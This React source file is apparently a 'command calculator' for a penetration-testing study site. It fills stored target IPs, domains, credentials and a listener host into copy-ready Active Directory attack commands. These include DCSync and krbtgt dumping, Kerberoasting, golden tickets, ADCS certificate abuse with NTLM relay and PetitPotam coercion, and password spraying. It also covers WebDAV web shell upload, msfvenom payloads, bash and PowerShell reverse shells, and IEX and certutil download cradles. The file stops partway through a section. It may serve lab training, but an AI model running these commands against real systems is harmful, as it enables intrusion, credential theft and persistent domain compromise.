import React, { useState, useMemo, useEffect } from "react";
import { nodes, PHASES } from "./utils/loadNodes";

/**
 * Command Calculator — a standalone page for The Path.
 * Saved host profiles + persistence; one active host feeds every command.
 * Auth-mode toggle (pw / hash / kerberos) and a literal ↔ $variable toggle
 * rewrite the whole command surface. Self-contained, no external deps.
 */

const FIELDS = [
  { k: "ip", label: "Target IP", ph: "10.10.10.5" },
  { k: "dcip", label: "DC IP", ph: "10.10.10.10" },
  { k: "host", label: "Hostname", ph: "dc01.corp.local" },
  { k: "domain", label: "Domain", ph: "corp.local" },
  { k: "user", label: "User", ph: "jdoe" },
  { k: "secret", label: "Password / Hash", ph: "Password123!" },
  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
  { k: "lport", label: "LPORT", ph: "4444" },
];
// fields that count toward "ready" (lport has a working default, so it's exempt)
const CORE = ["ip", "dcip", "host", "domain", "user", "secret", "lhost"];

const AUTH = [
  { id: "pw", label: "Password" },
  { id: "hash", label: "NTLM Hash" },
  { id: "krb", label: "Kerberos" },
];

const BLANK = () => ({ ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "" });
const newHost = (name) => ({ id: `h_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`, name, fields: BLANK() });

// persistence — localStorage in the deployed Vite app. Wrapped so SSR / blocked
// storage never throws; the calc just runs without persistence if unavailable.
const STORE_KEY = "thepath.commandcalc.v1";
const store = {
  load() {
    try { return JSON.parse(localStorage.getItem(STORE_KEY) || "null"); }
    catch { return null; }
  },
  save(state) {
    try { localStorage.setItem(STORE_KEY, JSON.stringify(state)); } catch { /* ignore */ }
  },
  clear() { try { localStorage.removeItem(STORE_KEY); } catch { /* ignore */ } },
};

// split a command string into plain text + amber <TOKEN> placeholders + cyan $vars
function tokenize(cmd) {
  return cmd.split(/(<[A-Z0-9_]+>|\$[a-zA-Z_]\w*)/g).map((part, i) => {
    if (/^<[A-Z0-9_]+>$/.test(part)) return <span key={i} className="tok">{part}</span>;
    if (/^\$[a-zA-Z_]\w*$/.test(part)) return <span key={i} className="var">{part}</span>;
    return <span key={i}>{part}</span>;
  });
}

function CmdCard({ label, cmd, note }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="cmd" onClick={copy} title="Click to copy">
      <div className="cmd-head">
        <span className="cmd-label">{label}</span>
        <span className={`cmd-copy${copied ? " ok" : ""}`}>{copied ? "copied" : "copy"}</span>
      </div>
      <pre className="cmd-text">{tokenize(cmd)}</pre>
      {note && <div className="cmd-note">{note}</div>}
    </div>
  );
}

// compact single-line result for the All-Path grep view
function CmdLine({ cmd, src }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="cmdline" onClick={copy} title="Click to copy">
      <pre className="cmdline-text">{tokenize(cmd)}</pre>
      <span className="cmdline-src">{copied ? "copied" : src}</span>
    </div>
  );
}

function Chip({ label, value }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="chip" onClick={copy} title="Click to copy">
      <span className="chip-label">{label}</span>
      <span className="chip-val">{copied ? "copied" : value}</span>
    </div>
  );
}

export default function CommandCalculator() {
  // ── persisted state: host profiles + active selection + modes ──
  const init = () => (typeof window !== "undefined" ? store.load() : null) || {};
  const saved = init();
  const [hosts, setHosts] = useState(
    saved.hosts && saved.hosts.length ? saved.hosts : [newHost("box 1")]
  );
  const [activeId, setActiveId] = useState(saved.activeId || null);
  const [authMode, setAuthMode] = useState(saved.authMode || "pw");
  const [varMode, setVarMode] = useState(saved.varMode || "literal"); // 'literal' | 'vars'
  const [active, setActive] = useState("setup");
  const [filter, setFilter] = useState("");
  const [mode, setMode] = useState("curated"); // 'curated' | 'all'
  const [renaming, setRenaming] = useState(null);

  // resolve the active host (fall back to first)
  const host = hosts.find((h) => h.id === activeId) || hosts[0];
  const f = host.fields;

  // persist whenever the durable bits change
  useEffect(() => {
    store.save({ hosts, activeId: host.id, authMode, varMode });
  }, [hosts, activeId, authMode, varMode]);

  // edit a field on the active host
  const set = (k) => (e) => {
    const val = e.target.value;
    setHosts((hs) => hs.map((h) => (h.id === host.id ? { ...h, fields: { ...h.fields, [k]: val } } : h)));
  };
  const addHost = () => {
    const h = newHost(`box ${hosts.length + 1}`);
    setHosts((hs) => [...hs, h]); setActiveId(h.id);
  };
  const delHost = (id) => {
    setHosts((hs) => {
      const next = hs.filter((h) => h.id !== id);
      const safe = next.length ? next : [newHost("box 1")];
      if (id === host.id) setActiveId(safe[0].id);
      return safe;
    });
  };
  const rename = (id, name) =>
    setHosts((hs) => hs.map((h) => (h.id === id ? { ...h, name: name || h.name } : h)));
  const clearAll = () => {
    store.clear();
    const h = newHost("box 1");
    setHosts([h]); setActiveId(h.id); setAuthMode("pw"); setVarMode("literal");
  };

  // ── derived tokens — literal value OR $variable, with unfilled <PLACEHOLDER> ──
  const V = varMode === "vars";
  // tok(value, $name, <PLACEHOLDER>): vars-mode shows $name when set, placeholder when not
  const tok = (val, vn, ph) => (V ? (val ? vn : ph) : (val || ph));

  const IP = tok(f.ip, "$ip", "<IP>");
  const DCIP = tok(f.dcip, "$dc", "<DC_IP>");
  const HOST = tok(f.host, "$host", "<HOST>");
  const D = tok(f.domain, "$domain", "<DOMAIN>");
  const U = tok(f.user, "$user", "<USER>");
  const SEC = tok(f.secret, "$pass", authMode === "hash" ? "<HASH>" : "<PASS>");
  const LHOST = tok(f.lhost, "$lhost", "<LHOST>");
  const LPORT = V ? (f.lport ? "$lport" : "4444") : (f.lport || "4444");
  const baseDN = V
    ? (f.domain ? "$baseDN" : "dc=<DOMAIN>")
    : (f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>");
  const NB = V ? (f.domain ? "$nb" : "<NB>") : (f.domain ? (f.domain.split(".")[0] || "").toUpperCase() : "<NB>");
  const SUBNET = V ? (f.ip ? "$subnet" : "<SUBNET>/24") : (f.ip ? f.ip.split(".").slice(0, 3).join(".") + ".0/24" : "<SUBNET>/24");
  const hostsLine = `${IP}\t${HOST} ${D} ${HOST.split(".")[0]}`;

  // unfilled accounting (literal-mode truth: what's actually empty on the host)
  const unfilled = CORE.filter((k) => !f[k]);

  // quoting flips with var-mode: literal '…' (protect specials) vs "…" ($expansion)
  const Q = V ? '"' : "'";

  // export block to seed a shell when running in $variable mode
  const exportBlock = useMemo(() => {
    if (!V) return null;
    const real = {
      ip: f.ip, dc: f.dcip, host: f.host, domain: f.domain, user: f.user,
      lhost: f.lhost, lport: f.lport,
    };
    const plain = Object.entries(real).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`);
    const lines = [];
    if (plain.length) lines.push(`export ${plain.join(" ")}`);
    if (f.secret) lines.push(`export pass='${f.secret}'`);
    const derived = [];
    if (f.domain) derived.push(`baseDN='${f.domain.split(".").map((p) => `dc=${p}`).join(",")}'`);
    if (f.domain) derived.push(`nb=${(f.domain.split(".")[0] || "").toUpperCase()}`);
    if (f.ip) derived.push(`subnet=${f.ip.split(".").slice(0, 3).join(".")}.0/24`);
    if (derived.length) lines.push(`export ${derived.join(" ")}`);
    return lines.join("\n");
  }, [V, f]);

  // target host: Kerberos demands the hostname, everything else the IP
  const TH = authMode === "krb" ? HOST : IP;

  // ── auth-aware fragment builders (quote style follows var-mode) ──
  const impTgt = (forceHost = false) => {
    const t = authMode === "krb" || forceHost ? HOST : IP;
    if (authMode === "pw") return `${Q}${D}/${U}:${SEC}@${t}${Q}`;
    if (authMode === "hash") return `${Q}${D}/${U}@${t}${Q} -hashes :${SEC}`;
    return `${Q}${D}/${U}@${t}${Q} -k -no-pass -dc-ip ${DCIP}`;
  };
  // DC-targeted variant — DCSync / domain replication must hit the DC, not the box
  const impDC = () => {
    const t = authMode === "krb" ? HOST : DCIP;
    if (authMode === "pw") return `${Q}${D}/${U}:${SEC}@${t}${Q}`;
    if (authMode === "hash") return `${Q}${D}/${U}@${t}${Q} -hashes :${SEC}`;
    return `${Q}${D}/${U}@${t}${Q} -k -no-pass -dc-ip ${DCIP}`;
  };
  const nxcA = () => {
    if (authMode === "pw") return `-u ${Q}${U}${Q} -p ${Q}${SEC}${Q}`;
    if (authMode === "hash") return `-u ${Q}${U}${Q} -H ${Q}${SEC}${Q}`;
    return `-u ${Q}${U}${Q} -k`;
  };
  const winrmAuth =
    authMode === "pw" ? `-p ${Q}${SEC}${Q}` : authMode === "hash" ? `-H ${SEC}` : `-r ${D}`;
  const ldapAuth = `-D "${U}@${D}" -w ${Q}${SEC}${Q}`;

  // ── services ────────────────────────────────────────────
  const services = useMemo(() => ({
    setup: {
      name: "Setup", groups: [
        { phase: "Resolve & scope", cmds: [
          { label: "Add to /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Kills the stale-/.com hostname gotcha before it bites." },
        ]},
        { phase: "First-touch nmap", cmds: [
          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 5000 -T4 -Pn ${IP} -oN allports.txt` },
          { label: "Extract open ports → $PORTS", cmd: `grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,\n# Capture into a var to feed the next scan:\nPORTS=$(grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,)`, note: "Output like 21,80,135,139,443,445 — feeds straight into -p below." },
          { label: "Targeted -sCV on open ports", cmd: `sudo nmap -sC -sV -p $PORTS ${IP} -oN targeted.txt`, note: "Run after the line above sets $PORTS — no hand-typing ports." },
          { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 -Pn ${IP} -oN udp.txt` },
        ]},
        { phase: "Subnet → live hosts (greppable)", cmds: [
          { label: "Host discovery (-sn)", cmd: `nmap -sn ${SUBNET} -oG hosts.gnmap` },
          { label: "Extract live IPs → live_hosts.txt", cmd: `grep Up hosts.gnmap | cut -d ' ' -f 2 > live_hosts.txt\ncat live_hosts.txt`, note: "Greppable -oG marks reachable hosts with 'Up' — pull column 2." },
          { label: "Mass scan the live list", cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt\ngrep open mass_scan.txt`, note: "Filter quick wins: grep -E '80|443|445|22|3389|5985' mass_scan.txt" },
        ]},
      ],
    },
    enum: {
      name: "Enumeration", groups: [
        { phase: "SMB / host", cmds: [
          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q}` },
          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
        ]},
        { phase: "Kerbrute / userlists", cmds: [
          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
          { label: "BloodHound (python)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip` },
        ]},
      ],
    },
    ldap: {
      name: "LDAP", groups: [
        { phase: "Connect & recon", cmds: [
          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u ${Q}${U}@${D}${Q} -p ${Q}${SEC}${Q} --da` },
        ]},
        { phase: "UAC bitmask filters", cmds: [
          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
        ]},
      ],
    },
    smb: {
      name: "SMB", groups: [
        { phase: "Shares", cmds: [
          { label: "smbmap", cmd: `smbmap -H ${IP} -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D}` },
          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U ${Q}${D}/${U}%${SEC}${Q}` },
          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U ${Q}${D}/${U}%${SEC}${Q}` },
          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
        ]},
      ],
    },
    ad: {
      name: "AD Attacks", groups: [
        { phase: "Auth & exec", cmds: [
          { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
          { label: "wmiexec (quieter)", cmd: `impacket-wmiexec ${impTgt()}` },
          { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
          { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
        ]},
        { phase: "Credentials", cmds: [
          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impDC()} -just-dc-ntlm -outputfile dcsync`, note: "Runs against the DC (uses DC IP), not the target box." },
          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impDC()} -just-dc-user Administrator` },
          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impDC()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}`, note: "Local dump — targets the box you have creds on." },
          { label: "Password spray (nxc)", cmd: `nxc smb ${IP} -u users.txt -p ${Q}${SEC}${Q} --continue-on-success`, note: "Check --pass-pol first. One spray per lockout window." },
        ]},
        { phase: "Roasting", cmds: [
          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt` },
          { label: "Kerberoast (impacket)", cmd: authMode === "krb"
            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
            : `impacket-GetUserSPNs ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP} -request -outputfile tgs.txt` },
          { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat so it cracks with -m 18200." },
        ]},
      ],
    },
    kerberos: {
      name: "Kerberos", groups: [
        { phase: "Tickets", cmds: [
          { label: "Request TGT", cmd: authMode === "hash"
            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
            : `impacket-getTGT ${Q}${D}/${U}:${SEC}${Q} -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
        ]},
        { phase: "Rubeus (on a Windows foothold)", cmds: [
          { label: "Kerberoast → hashes", cmd: `.\\Rubeus.exe kerberoast /nowrap /outfile:tgs.txt`, note: "Crack with hashcat -m 13100." },
          { label: "AS-REP roast", cmd: `.\\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep.txt` },
          { label: "Dump + monitor TGTs", cmd: `.\\Rubeus.exe triage\n.\\Rubeus.exe monitor /interval:5 /nowrap`, note: "monitor harvests tickets as users log in." },
          { label: "Pass-the-ticket (inject)", cmd: `.\\Rubeus.exe ptt /ticket:BASE64_OR_KIRBI`, note: "Inject a stolen/forged ticket into the current session." },
          { label: "Overpass-the-hash → TGT", cmd: `.\\Rubeus.exe asktgt /user:${U} /rc4:${SEC} /ptt`, note: "Turn an NT hash into a usable TGT in-session." },
        ]},
      ],
    },
    localadmin: {
      name: "Local Admin / Creds", groups: [
        { phase: "Am I local admin? (the --local-auth check)", cmds: [
          { label: "Check one host (look for Pwn3d!)", cmd: `nxc smb ${IP} ${nxcA()} --local-auth`, note: "(Pwn3d!) = local admin on THIS box. LAPS/SAM creds are LOCAL, so --local-auth is mandatory." },
          { label: "Spray a hash across the subnet", cmd: `nxc smb ${SUBNET} -u Administrator -H ${SEC} --local-auth`, note: "Find every host where this local hash works — classic local-admin reuse sweep." },
          { label: "psexec as local admin", cmd: `impacket-psexec administrator:${Q}${SEC}${Q}@${IP}`, note: "Drop -hashes :HASH instead of the password if you only have the hash." },
        ]},
        { phase: "LAPS (read the local admin password)", cmds: [
          { label: "Confirm + dump readers", cmd: `nxc ldap ${IP} ${nxcA()} -M laps`, note: "If the reader isn't you, find who can: enumerate the computer object's ACL." },
          { label: "ldapsearch fallback (legacy attr)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=computer)(cn=${HOST}))" ms-Mcs-AdmPwd` },
          { label: "Use it → local admin on the box", cmd: `nxc smb ${IP} -u administrator -p ${Q}LAPS_PW${Q} --local-auth`, note: "Then psexec --local-auth. If it's the DC, that's SYSTEM → DCSync." },
        ]},
        { phase: "No creds yet — pull users", cmds: [
          { label: "RID brute (null/guest)", cmd: `nxc smb ${IP} -u '' -p '' --rid-brute`, note: "Enumerates domain users via SID cycling with no creds." },
          { label: "lookupsid", cmd: `impacket-lookupsid ${D}/${U}:${Q}${SEC}${Q}@${IP}` },
          { label: "Build users.txt from RID brute", cmd: `nxc smb ${IP} -u '' -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 > users.txt` },
        ]},
        { phase: "Resolve SIDs", cmds: [
          { label: "ConvertFrom-SID (PowerView)", cmd: `ConvertFrom-SID S-1-5-21-...-1115`, note: "Turn an ACL/LAPS-reader SID into a name. RID 512 = Domain Admins; 1100+ = a custom principal." },
        ]},
      ],
    },
    aclabuse: {
      name: "ACL Abuse", groups: [
        { phase: "Find the edge", cmds: [
          { label: "What can I abuse? (BloodHound)", cmd: `bloodhound-python -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} -ns ${DCIP} -c All --zip`, note: "Mark yourself Owned, run 'Shortest paths from Owned principals'." },
          { label: "ACLs on a target object", cmd: `Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (ConvertTo-SID ${Q}${U}${Q}) }`, note: "Look for GenericAll / GenericWrite / WriteDacl / ForceChangePassword." },
        ]},
        { phase: "ForceChangePassword / GenericAll on a user", cmds: [
          { label: "Reset the target's password", cmd: `net rpc password TARGETUSER 'NewPass123!' -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Loud (changes a real password). In labs fine; note it for the report." },
          { label: "PowerView variant", cmd: `$p=ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force; Set-DomainUserPassword -Identity TARGETUSER -AccountPassword $p` },
        ]},
        { phase: "GenericWrite on a user → targeted roast", cmds: [
          { label: "Add an SPN, then kerberoast", cmd: `targetedKerberoast.py -v -d ${D} -u ${U} -p ${Q}${SEC}${Q} --request-user TARGETUSER`, note: "Sets a temporary SPN, roasts, removes it — no password reset needed." },
        ]},
        { phase: "GenericAll on a group / RBCD", cmds: [
          { label: "Add yourself to a group", cmd: `net rpc group addmem "TARGET GROUP" ${U} -U ${Q}${D}/${U}%${SEC}${Q} -S ${DCIP}`, note: "Then re-auth to pick up the new membership." },
          { label: "RBCD (GenericWrite on a computer)", cmd: `impacket-rbcd -delegate-to TARGET\\$ -delegate-from ${U} -action write ${Q}${D}/${U}:${SEC}${Q}`, note: "Then getST -impersonate Administrator for the target host." },
        ]},
      ],
    },
    adcs: {
      name: "ADCS / Certipy", groups: [
        { phase: "Find vulnerable templates", cmds: [
          { label: "certipy find (vuln only)", cmd: `certipy find -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -vulnerable -stdout`, note: "Flags ESC1-16. Start here." },
          { label: "certipy find (full, hash)", cmd: `certipy find -u ${U}@${D} -hashes :${SEC} -dc-ip ${DCIP} -stdout` },
          { label: "nxc ADCS module", cmd: `nxc ldap ${IP} ${nxcA()} -M adcs` },
        ]},
        { phase: "ESC1 — request as anyone", cmds: [
          { label: "Request cert w/ alt SID (DA)", cmd: `certipy req -u ${U}@${D} -p ${Q}${SEC}${Q} -dc-ip ${DCIP} -ca CA-NAME -template VULN-TEMPLATE -upn administrator@${D}`, note: "Get CA-NAME + template from 'certipy find'. On patched DCs (May 2022) add -sid <target SID> for the SID extension." },
          { label: "Auth with the cert → hash/TGT", cmd: `certipy auth -pfx administrator.pfx -dc-ip ${DCIP}`, note: "Returns the NT hash + a TGT for Administrator." },
        ]},
        { phase: "ESC8 — relay to web enroll", cmds: [
          { label: "Relay to CA enrollment", cmd: `impacket-ntlmrelayx -t http://${DCIP}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`, note: "Pair with a coerce (PetitPotam/Coercer) to capture the DC$ cert." },
          { label: "Coerce the DC", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${DCIP}` },
        ]},
        { phase: "Use the result", cmds: [
          { label: "Pass-the-cert / DCSync", cmd: `impacket-secretsdump -just-dc ${Q}${D}/administrator${Q}@${DCIP} -hashes :RECOVERED_HASH`, note: "Use the NT hash certipy auth returned." },
        ]},
      ],
    },
    relay: {
      name: "Relay / Poison", groups: [
        { phase: "Capture & relay", cmds: [
          { label: "responder", cmd: `sudo responder -I tun0 -wv`, note: "Add -A first to analyze-only (passive); drop -A to actively poison." },
          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u ${Q}${U}${Q} -p ${Q}${SEC}${Q} -d ${D} ${LHOST} ${IP}` },
        ]},
      ],
    },
    mssql: {
      name: "MSSQL", groups: [
        { phase: "Connect & exec", cmds: [
          { label: "mssqlclient", cmd: authMode === "krb"
            ? `impacket-mssqlclient -k ${D}/${U}@${HOST} -dc-ip ${DCIP}`
            : `impacket-mssqlclient ${Q}${D}/${U}:${SEC}${Q}@${IP} -windows-auth` },
          { label: "enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';` },
        ]},
      ],
    },
    winrm: {
      name: "WinRM", groups: [
        { phase: "Shell", cmds: [
          { label: "evil-winrm", cmd: `evil-winrm -i ${TH} -u ${U} ${winrmAuth}`, note: authMode === "krb" ? "Needs KRB5CCNAME set + host in /etc/hosts." : null },
          { label: "nxc winrm — check + exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
        ]},
      ],
    },
    rdp: {
      name: "RDP", groups: [
        { phase: "Connect", cmds: [
          { label: "xfreerdp", cmd: authMode === "hash"
            ? `xfreerdp /u:${U} /pth:${SEC} /v:${IP} +clipboard /cert:ignore`
            : `xfreerdp /u:${U} /p:${Q}${SEC}${Q} /v:${TH} +clipboard /cert:ignore` },
          { label: "nxc rdp — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
        ]},
      ],
    },
    webdav: {
      name: "WebDAV", groups: [
        { phase: "Detect", cmds: [
          { label: "nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
          { label: "OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
          { label: "Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
        ]},
        { phase: "Confirm what lands (davtest)", cmds: [
          { label: "davtest", cmd: `davtest -url http://${IP}` },
          { label: "davtest — authed", cmd: `davtest -url http://${IP} -auth ${Q}${U}:${SEC}${Q}`, note: `Domain box? try the prefixed form ${Q}${NB}\\${U}:${SEC}${Q}.` },
        ]},
        { phase: "Upload → RCE (IIS bypass)", cmds: [
          { label: "Make the shell (IIS / PHP)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
          { label: "PUT .txt then MOVE to .aspx", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u ${Q}${U}:${SEC}${Q} -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
          { label: "Direct PUT (PHP stack)", cmd: `curl -s -u ${Q}${U}:${SEC}${Q} -X PUT http://${IP}/shell.php --data-binary @shell.php` },
          { label: "Trigger it", cmd: `curl "http://${IP}/shell.aspx"   # browse to execute` },
        ]},
        { phase: "Interactive (cadaver)", cmds: [
          { label: "cadaver — open session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
          { label: "Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\nmkcol loot                  # make a dir\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, not shell — type them at the dav:/> prompt." },
          { label: "Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
        ]},
      ],
    },
    payloads: {
      name: "Payloads / Shells", groups: [
        { phase: "msfvenom", cmds: [
          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe` },
          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf` },
        ]},
        { phase: "One-liners & listeners", cmds: [
          { label: "Bash reverse shell", cmd: `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'` },
          { label: "PowerShell reverse (IEX cradle)", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` },
          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}` },
        ]},
      ],
    },
    transfer: {
      name: "File Transfer", groups: [
        { phase: "Serve", cmds: [
          { label: "HTTP server (Kali)", cmd: `python3 -m http.server 80` },
          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` },
        ]},
        { phase: "Pull (on target)", cmds: [
          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}/shell.exe shell.exe` },
          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}/shell.exe -OutFile shell.exe` },
          { label: "Linux — wget", cmd: `wget http://${LHOST}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
        ]},
      ],
    },
    winpriv: {
      name: "Win Privesc", groups: [
        { phase: "Triage", cmds: [
          { label: "Token privileges", cmd: `whoami /priv`, note: "SeImpersonate/SeAssignPrimaryToken → Potato to SYSTEM. SeBackup/SeRestore → dump SAM." },
          { label: "Groups + context", cmd: `whoami /all\nnet user %username%` },
          { label: "winPEAS", cmd: `.\\winPEASx64.exe` },
          { label: "PowerUp checks", cmd: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}/PowerUp.ps1'); Invoke-AllChecks"` },
          { label: "Quick wins (services/unquoted)", cmd: `accesschk.exe -uwcqv "Users" *\nwmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows"`, note: "Unquoted path with a space + writable parent dir = binary-planting hijack." },
        ]},
        { phase: "SeImpersonate → SYSTEM (potatoes)", cmds: [
